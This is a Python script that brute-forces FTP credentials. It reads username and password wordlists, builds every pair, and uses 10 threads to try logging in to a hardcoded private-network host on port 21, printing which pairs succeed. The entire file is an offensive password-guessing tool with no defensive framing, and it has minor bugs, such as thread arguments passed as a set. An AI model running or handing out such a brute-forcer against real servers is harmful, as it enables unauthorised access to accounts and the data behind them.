import ftplib
import threading
import queue

# 110.34 :21
import sys


def fuzzFtp(ip, port):
    while not que.empty():
        username_password = que.get()
        userpass = str(username_password).split(':')
        ftp = ftplib.FTP()
        ftp.connect(ip, port)

        try:
            username = userpass[0]
            passaword = userpass[1]
            ftp.login(username, passaword)
            ftp.retrlines('list')
            print(username + ':' + passaword + ' right')
        except ftplib.all_errors:
            print(username + ':' + passaword + ' wrong')
            pass


if __name__ == '__main__':
    # ip = '192.168.110.34'
    # port = 21
    que = queue.Queue()
    # It's advisable for you to put `for` outside when using multi-threading
    for username in open('weakname.txt', encoding='utf-8'):
        for password in open('weakpass.txt', encoding='utf-8'):
            username = username.replace('\n', '')
            password = password.replace('\n', '')
            que.put(username + ':' + password)
    # 10 is threading number
    ip = '192.168.110.34'
    port = 21
    for thread in range(10):
        t = threading.Thread(target=fuzzFtp, args={ip, port})
        t.start()
